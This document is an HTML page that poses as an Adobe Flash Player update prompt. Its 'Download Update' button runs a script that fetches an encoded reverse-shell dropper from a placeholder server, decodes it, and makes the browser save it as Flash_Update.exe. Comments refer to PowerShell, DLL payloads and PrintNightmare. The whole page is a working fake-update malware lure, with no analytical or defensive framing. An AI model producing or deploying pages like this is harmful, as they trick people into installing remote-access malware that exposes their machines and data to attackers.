<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Flash Player Critical Update</title>
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 10%;
    }
    .box {
      background-color: #fff;
      border: 1px solid #ccc;
      display: inline-block;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px #aaa;
    }
    button {
      background-color: #0078D7;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005a9e;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Adobe Flash Player Update Required</h2>
    <p>To continue viewing this content, please update Flash Player to the latest version.</p>
    <button onclick="triggerDropper()">Download Update</button>
  </div>

  <script>
    function triggerDropper() {
      // Dynamically fetch the encoded reverse shell dropper (PowerShell or DLL)
      fetch("http://yourserver.com/payload/encoded_dropper.txt")
        .then(response => response.text())
        .then(base64Data => {
          const byteCharacters = atob(base64Data);
          const byteArrays = [];

          for (let offset = 0; offset < byteCharacters.length; offset += 512) {
            const slice = byteCharacters.slice(offset, offset + 512);
            const byteNumbers = new Array(slice.length);
            for (let i = 0; i < slice.length; i++) {
              byteNumbers[i] = slice.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            byteArrays.push(byteArray);
          }

          const blob = new Blob(byteArrays, { type: 'application/octet-stream' });
          const link = document.createElement('a');
          link.href = window.URL.createObjectURL(blob);
          link.download = "Flash_Update.exe"; // Simulated EXE or .dll if using PrintNightmare
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
        })
        .catch(err => {
          console.error("Payload fetch failed:", err);
          alert("Update failed. Please try again later.");
        });
    }
  </script>
</body>
</html>
